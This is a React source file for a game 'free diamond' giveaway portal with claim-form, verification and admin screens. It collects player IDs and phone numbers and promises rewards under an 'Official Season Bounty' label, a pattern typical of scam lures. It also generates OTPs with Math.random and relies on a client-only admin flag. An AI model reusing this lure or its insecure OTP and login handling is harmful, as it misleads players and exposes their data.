import React, { useState, useEffect } from 'react';
import { AppScreen, AppConfig, GiveawaySubmission, AdminMedia, ActiveClaim } from './types';
import {
  loadConfig, saveConfig,
  loadSubmissions, saveSubmissions,
  loadMedia, saveMedia,
  loadActiveClaim, saveActiveClaim
} from './data/storage';
import { Header } from './components/Header';
import { HomeScreen } from './screens/HomeScreen';
import { ClaimFormScreen } from './screens/ClaimFormScreen';
import { VerificationScreen } from './screens/VerificationScreen';
import { AdminLoginScreen } from './screens/AdminLoginScreen';
import { AdminDashboardScreen } from './screens/AdminDashboardScreen';

export const App: React.FC = () => {
  const [currentScreen, setCurrentScreen] = useState<AppScreen>('HOME');
  const [appConfig, setAppConfig] = useState<AppConfig>(loadConfig);
  const [submissions, setSubmissions] = useState<GiveawaySubmission[]>(loadSubmissions);
  const [mediaList, setMediaList] = useState<AdminMedia[]>(loadMedia);
  const [activeClaim, setActiveClaim] = useState<ActiveClaim | null>(loadActiveClaim);
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);

  // Sync state to local persistence
  useEffect(() => {
    saveConfig(appConfig);
  }, [appConfig]);

  useEffect(() => {
    saveSubmissions(submissions);
  }, [submissions]);

  useEffect(() => {
    saveMedia(mediaList);
  }, [mediaList]);

  useEffect(() => {
    saveActiveClaim(activeClaim);
  }, [activeClaim]);

  // Helper to generate unique 8-digit OTP
  const generateUniqueOtp = (): string => {
    const code = Math.floor(10000000 + Math.random() * 90000000).toString();
    return code;
  };

  // Claim Form submission handler
  const handleClaimSubmit = (data: Omit<GiveawaySubmission, 'id' | 'timestamp' | 'status' | 'otpCode' | 'notes'>) => {
    const otpCode = generateUniqueOtp();
    const newSubmission: GiveawaySubmission = {
      ...data,
      id: `claim-${Date.now()}`,
      timestamp: Date.now(),
      status: 'PENDING',
      otpCode,
      notes: 'Generated via web claim portal'
    };

    const newActiveClaim: ActiveClaim = {
      id: newSubmission.id,
      playerName: newSubmission.playerName,
      euid: newSubmission.euid,
      level: newSubmission.level,
      phoneNumber: newSubmission.phoneNumber,
      serverRegion: newSubmission.serverRegion,
      otpCode,
      status: 'PENDING',
      timestamp: Date.now()
    };

    setSubmissions(prev => [newSubmission, ...prev]);
    setActiveClaim(newActiveClaim);
    setCurrentScreen('VERIFICATION');
  };

  // Admin Actions
  const handleUpdateStatus = (id: string, status: 'PENDING' | 'APPROVED' | 'REJECTED') => {
    setSubmissions(prev => prev.map(sub => sub.id === id ? { ...sub, status } : sub));
    if (activeClaim && activeClaim.id === id) {
      setActiveClaim(prev => prev ? { ...prev, status } : null);
    }
  };

  const handleRegenerateOtp = (id: string) => {
    const newCode = generateUniqueOtp();
    setSubmissions(prev => prev.map(sub => sub.id === id ? { ...sub, otpCode: newCode } : sub));
    if (activeClaim && activeClaim.id === id) {
      setActiveClaim(prev => prev ? { ...prev, otpCode: newCode } : null);
    }
  };

  const handleDeleteSubmission = (id: string) => {
    setSubmissions(prev => prev.filter(sub => sub.id !== id));
    if (activeClaim && activeClaim.id === id) {
      setActiveClaim(null);
    }
  };

  const handleSaveConfig = (newConfig: AppConfig) => {
    setAppConfig(newConfig);
  };

  const handleAddMedia = (media: Omit<AdminMedia, 'id' | 'createdAt'>) => {
    const newMedia: AdminMedia = {
      ...media,
      id: `med-${Date.now()}`,
      createdAt: Date.now()
    };
    setMediaList(prev => [newMedia, ...prev]);
  };

  const handleDeleteMedia = (id: string) => {
    setMediaList(prev => prev.filter(m => m.id !== id));
  };

  const handleClearAllMedia = () => {
    setMediaList([]);
  };

  return (
    <div className="min-h-screen bg-[#F6F9FD] flex flex-col font-sans">
      <Header
        currentScreen={currentScreen}
        appConfig={appConfig}
        onNavigate={setCurrentScreen}
        isAdminLoggedIn={isAdminLoggedIn}
      />

      <main className="flex-1 max-w-4xl w-full mx-auto p-4 md:p-6">
        {currentScreen === 'HOME' && (
          <HomeScreen
            appConfig={appConfig}
            mediaList={mediaList}
            onGetLink={() => setCurrentScreen('CLAIM_FORM')}
            onAdminClick={() => setCurrentScreen(isAdminLoggedIn ? 'ADMIN_DASHBOARD' : 'ADMIN_LOGIN')}
          />
        )}

        {currentScreen === 'CLAIM_FORM' && (
          <ClaimFormScreen
            appConfig={appConfig}
            onSubmit={handleClaimSubmit}
            onBack={() => setCurrentScreen('HOME')}
            onAdminClick={() => setCurrentScreen(isAdminLoggedIn ? 'ADMIN_DASHBOARD' : 'ADMIN_LOGIN')}
          />
        )}

        {currentScreen === 'VERIFICATION' && (
          <VerificationScreen
            activeClaim={activeClaim}
            appConfig={appConfig}
            onBackToHome={() => setCurrentScreen('HOME')}
          />
        )}

        {currentScreen === 'ADMIN_LOGIN' && (
          <AdminLoginScreen
            onSuccess={() => {
              setIsAdminLoggedIn(true);
              setCurrentScreen('ADMIN_DASHBOARD');
            }}
            onBack={() => setCurrentScreen('HOME')}
          />
        )}

        {currentScreen === 'ADMIN_DASHBOARD' && (
          <AdminDashboardScreen
            appConfig={appConfig}
            submissions={submissions}
            mediaList={mediaList}
            onUpdateStatus={handleUpdateStatus}
            onRegenerateOtp={handleRegenerateOtp}
            onDeleteSubmission={handleDeleteSubmission}
            onSaveConfig={handleSaveConfig}
            onAddMedia={handleAddMedia}
            onDeleteMedia={handleDeleteMedia}
            onClearAllMedia={handleClearAllMedia}
            onLogout={() => {
              setIsAdminLoggedIn(false);
              setCurrentScreen('HOME');
            }}
          />
        )}
      </main>

      {/* Global Footer */}
      <footer className="bg-white border-t border-[#E0E3E8] py-6 px-4 text-center text-xs text-[#72777F] space-y-1">
        <p className="font-semibold text-[#002E54]">
          {appConfig.appTitle || "FREE WARRIOR GIVEAWAY"} • Official Season Bounty
        </p>
        <p className="max-w-md mx-auto text-[11px] text-[#72777F]/80">
          Either you will get the redeem code, or you will get the diamond in your mailbox within an hour or a day.
        </p>
      </footer>
    </div>
  );
};
